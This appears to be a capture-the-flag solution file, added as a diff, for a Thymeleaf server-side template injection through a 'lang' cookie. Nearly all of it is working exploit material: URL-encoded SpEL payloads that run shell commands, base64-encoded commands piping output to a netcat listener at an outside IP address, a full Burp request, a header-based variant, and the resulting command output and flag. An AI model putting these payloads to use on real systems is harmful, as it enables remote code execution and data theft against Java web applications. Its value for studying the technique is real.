@@ -1,0 +1,100 @@
+Cookie: lang=a
+	<td>Exception</td>
+    <td>org.thymeleaf.exceptions.TemplateInputException</td>
+
+
+=============== solution 1 (Use strings.arraySplit) ===============
+
+# id
+echo -n "id|nc 140.113.24.143 9001" | base64
+```
+aWR8bmMgMTQwLjExMy4yNC4xNDMgOTAwMQ==
+```
+
+#strings.arraySplit("sh_-c_echo aWR8bmMgMTQwLjExMy4yNC4xNDMgOTAwMQ==|base64 -d|sh",'_')
+=> URL Encode
+
+Payload
+	Cookie: lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%23%73%74%72%69%6e%67%73%2e%61%72%72%61%79%53%70%6c%69%74%28%22%73%68%5f%2d%63%5f%65%63%68%6f%20%61%57%52%38%62%6d%4d%67%4d%54%51%77%4c%6a%45%78%4d%79%34%79%4e%43%34%78%4e%44%4d%67%4f%54%41%77%4d%51%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%73%68%22%2c%27%5f%27%29).getInputStream()).next()%7d__::.x
+
+return
+	uid=65534(nobody) gid=65534(nobody)
+
+
+# ls /
+echo -n "ls /|nc 140.113.24.143 9001" | base64
+```
+bHMgL3xuYyAxNDAuMTEzLjI0LjE0MyA5MDAx
+```
+
+#strings.arraySplit("sh_-c_echo bHMgL3xuYyAxNDAuMTEzLjI0LjE0MyA5MDAx|base64 -d|sh",'_') => URL Encode
+
+Payload
+	Cookie: lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%23%73%74%72%69%6e%67%73%2e%61%72%72%61%79%53%70%6c%69%74%28%22%73%68%5f%2d%63%5f%65%63%68%6f%20%62%48%4d%67%4c%33%78%75%59%79%41%78%4e%44%41%75%4d%54%45%7a%4c%6a%49%30%4c%6a%45%30%4d%79%41%35%4d%44%41%78%7c%62%61%73%65%36%34%20%2d%64%7c%73%68%22%2c%27%5f%27%29).getInputStream()).next()%7d__::.x
+
+return
+	app
+	bin
+	dev
+	etc
+	home
+	lib
+	lib64
+	media
+	mnt
+	opt
+	proc
+	root
+	run
+	sbin
+	srv
+	start.sh
+	sys
+	tmp
+	try_find_me.txt
+	usr
+	var
+
+
+# cat /try_find_me.txt
+echo -n "cat /try_find_me.txt|nc 140.113.24.143 9001" | base64
+```
+Y2F0IC90cnlfZmluZF9tZS50eHR8bmMgMTQwLjExMy4yNC4xNDMgOTAwMQ==
+```
+
+#strings.arraySplit("sh_-c_echo Y2F0IC90cnlfZmluZF9tZS50eHR8bmMgMTQwLjExMy4yNC4xNDM6OTAwMQ==|base64 -d|sh",'_') => URL Encode
+
+Payload
+	Cookie: lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%23%73%74%72%69%6e%67%73%2e%61%72%72%61%79%53%70%6c%69%74%28%22%73%68%5f%2d%63%5f%65%63%68%6f%20%59%32%46%30%49%43%39%30%63%6e%6c%66%5a%6d%6c%75%5a%46%39%74%5a%53%35%30%65%48%52%38%62%6d%4d%67%4d%54%51%77%4c%6a%45%78%4d%79%34%79%4e%43%34%78%4e%44%4d%36%4f%54%41%77%4d%51%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%73%68%22%2c%27%5f%27%29).getInputStream()).next()%7d__::.x
+
+return
+	Aero{j4va_1s_better_th4n_engl1sh}
+
+
+Burp
+
+GET / HTTP/1.1
+Host: 151.236.114.211:7878
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%23%73%74%72%69%6e%67%73%2e%61%72%72%61%79%53%70%6c%69%74%28%22%73%68%5f%2d%63%5f%65%63%68%6f%20%59%32%46%30%49%43%39%30%63%6e%6c%66%5a%6d%6c%75%5a%46%39%74%5a%53%35%30%65%48%52%38%62%6d%4d%67%4d%54%51%77%4c%6a%45%78%4d%79%34%79%4e%43%34%78%4e%44%4d%36%4f%54%41%77%4d%51%3d%3d%7c%62%61%73%65%36%34%20%2d%64%7c%73%68%22%2c%27%5f%27%29).getInputStream()).next()%7d__::.x
+Connection: close
+
+
+
+=============== solution 2 (Use ,)===============
+
+python3 solve2.py
+
+
+=============== solution 3 (Use Header)===============
+
+__${#response.setHeader("cmd-out",#uris.escapeQueryParam(new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())).lines().toArray()[0]))}__::.x
+	cmd-out: uid%3D0(root)%20gid%3D0(root)%20groups%3D0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+python3 solve3.py
+
